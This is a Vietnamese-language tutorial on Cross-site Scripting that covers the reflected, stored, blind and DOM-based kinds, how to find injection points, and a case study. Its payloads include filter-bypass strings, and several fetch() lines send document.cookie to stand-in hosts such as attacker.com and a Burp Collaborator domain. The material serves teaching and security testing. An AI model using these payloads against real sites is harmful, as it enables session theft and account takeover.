**Cross-site Scripting (XSS)** là một loại lỗ hổng bảo mật trong ứng dụng web, cho phép attacker chèn và thực thi mã độc (thường là JavaScript) vào trình duyệt của người dùng thông qua những điểm đầu vào không được xử lý đúng cách.
XSS cho phép attacker:
- Đánh cắp cookie, session
- Thực hiện hành vi phishing
- Tạo keylogger
- Tấn công CSRF thông minh hơn
- Thực hiện SSRF từ client (qua fetch, XMLHttpRequest)
- Chiếm quyền tài khoản admin (nếu kết hợp với Blind XSS)
## Các loại XSS
### 1. Reflected XSS
- Mã độc nằm trong URL, được phản hồi lại **ngay** khi nạn nhân truy cập.
- Không lưu trữ mã độc trên server.
**Ví dụ:**
```http
GET /search?query=<script>alert(document.cookie)</script>
```
Khi người dùng bấm vào link:
```html
http://example.com/search?query=<script>alert(document.cookie)</script>
```
→ Nếu server phản hồi lại nguyên nội dung `query`, script sẽ thực thi.
**Payload phổ biến:**
```html
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
```
### 2. Stored XSS
- Mã độc được lưu trữ trong cơ sở dữ liệu (comment, bio, bài viết...)
- Khi người dùng khác truy cập → script tự động thực thi.
**Ví dụ:**
```html
<script src="https://attacker.com/x.js"></script>
```
Kẻ tấn công lưu payload trên profile cá nhân, khi admin truy cập hồ sơ → bị chiếm session.
### 3. Blind XSS
- Tương tự Stored XSS nhưng:
  - Script không hiển thị cho chính attacker
  - Mà kích hoạt ở môi trường khác, ví dụ trang quản trị
**Ví dụ thực tế:**
- Chèn vào form feedback:
```html
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
```
- Admin đọc phản hồi tại dashboard → bị đánh cắp cookie
**Các điểm cần test:**
- Contact / Feedback forms
- Admin logs, alert systems
- Webhooks, hệ thống báo lỗi nội bộ
---
### Tấn công bằng fetch() kết hợp Burp Collaborator
```js
<script>fetch("https://abc.burpcollaborator.net?c="+document.cookie)</script>
```
### DOM-based XSS (JS thực thi client-side)
- Ví dụ code dễ dính lỗi:
```js
document.body.innerHTML = "Search: " + location.hash;
```
- Payload:
```url
http://example.com/#<img src=x onerror=alert(1)>
```
### Polyglot payload để bypass filter:
```html
"><svg/onload=alert(1)>
<iframe/src=javascript:alert(1)>
```
---
## Cách tìm điểm XSS
1. **Xác định input → output**
   - URL params (`?q=`)
   - Form inputs (comment, profile name, message)
   - Header injection (`Referer`, `User-Agent`...)
2. **Tìm nơi phản hồi**
   - Trong HTML (`<div>{{ input }}</div>`)
   - Trong JS (`var x = '{{ input }}';`)
   - Trong attributes (`<img src="{{ input }}">`)
3. **Thử payload**
   - HTML injection: `<h1>`, `<script>`, `<img onerror=...>`
   - JS context: `';alert(1)//`
   - Attribute context: `"><svg/onload=alert(1)>`
## Case Study: Stored XSS trong Blog App
1. Ứng dụng cho phép người dùng đăng bài viết
2. Payload attacker đăng:  
```html
<script>fetch('https://attacker.com/c?'+document.cookie)</script>
```
3. Khi admin duyệt bài viết → bị đánh cắp cookie
4. Attacker đăng nhập với cookie của admin → xóa dữ liệu người dùng

---
